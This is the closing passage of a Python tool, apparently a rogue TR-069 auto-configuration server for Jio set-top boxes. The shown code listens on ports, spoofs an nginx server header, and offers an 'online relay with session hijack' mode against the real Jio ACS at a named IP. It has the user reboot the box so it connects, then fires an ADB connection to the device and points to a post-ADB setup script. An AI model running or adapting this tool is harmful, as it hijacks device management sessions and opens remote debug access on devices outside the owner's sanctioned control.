  Open a second Command Prompt / PowerShell window and run:
      .\\1CLICK_POST_ADB_SETUP.bat
======================================================================
"""
                        log(banner, to_stdout=True)

                        def _trigger_adb_probe():
                            import time
                            time.sleep(2.0)
                            try:
                                import subprocess
                                adb_bin = os.path.join(BASE_DIR, "bin", "adb.exe")
                                if not os.path.exists(adb_bin):
                                    adb_bin = "adb"
                                subprocess.run([adb_bin, "connect", "192.168.50.2:5555"], capture_output=True, timeout=8)
                            except Exception:
                                pass
                        threading.Thread(target=_trigger_adb_probe, daemon=True).start()
                    continue
            
            # ---- Unknown / Empty POST without session ----
            date_hdr = get_http_date().encode()
            resp_headers = {
                "Server": "nginx/1.30.1",
                "Date": date_hdr.decode(),
                "Connection": "keep-alive"
            }
            s.sendall(
                b"HTTP/1.1 204 No Content\r\n"
                b"Server: nginx/1.30.1\r\n"
                b"Date: " + date_hdr + b"\r\n"
                b"Connection: keep-alive\r\n\r\n"
            )
            log_packet("OUTGOING", cid, "HTTP/1.1 204 No Content", resp_headers, None, note="204 Untracked Session")
            continue

    except Exception as e:
        log(f"{cid} handle error: {type(e).__name__}: {e}")
    finally:
        try: s.close()
        except: pass

def serve_port(port):
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((BIND_ADDR, port))
        srv.listen(64)
        log(f"### listening on {BIND_ADDR}:{port} ###")
        while True:
            try:
                conn, addr = srv.accept()
                threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
            except Exception as e:
                log(f"accept error on port {port}: {e}")
    except Exception as e:
        log(f"[ERROR] Could not bind port {port}: {e}")

def main():
    global UPSTREAM_ONLINE
    try:
        log("==========================================================")
        log("  Jio STB Mock ACS Engine (Relay + Standalone Dual)       ")
        log(f"  Packet Log: {PACKET_LOG_FILE}")
        
        log(f"  Target STB Family: {TARGET_MODEL.upper()} Series")
        log(f"  Active Certificate: {os.path.basename(CERT_FILE)}")
        
        log("  Checking upstream connectivity to Real Jio ACS (49.40.134.113:8443)...")
        UPSTREAM_ONLINE = test_upstream_connectivity(timeout=1.5)
        if UPSTREAM_ONLINE:
            log("  [+] Mode: ONLINE RELAY with Session Hijack (Auto-Online)")
        else:
            log("  [!] Mode: OFFLINE STANDALONE Local ACS (Auto-Fallback)")
        log("==========================================================")
        log("  >>> ACTION REQUIRED: POWER-CYCLE (REBOOT) THE JIO STB NOW <<<")
        log("  1. Unplug the STB power cable from the back.")
        log("  2. Wait 5 seconds, then plug it back in.")
        log("  * The STB TR-069 CWMP client ONLY connects during bootup!")
        log("==========================================================")
        
        threads = []
        for p in PORTS:
            t = threading.Thread(target=serve_port, args=(p,), daemon=True)
            t.start()
            threads.append(t)
        
        while True:
            threading.Event().wait(1.0)
            
    except KeyboardInterrupt:
        log("Mock ACS stopped by user.")
    except Exception as e:
        err_msg = f"[FATAL CRASH] {type(e).__name__}: {e}\n{traceback.format_exc()}"
        log(err_msg)
        print("\n" + err_msg)
        try:
            input("\nPress Enter to exit...")
        except Exception:
            pass

if __name__ == "__main__":
    main()
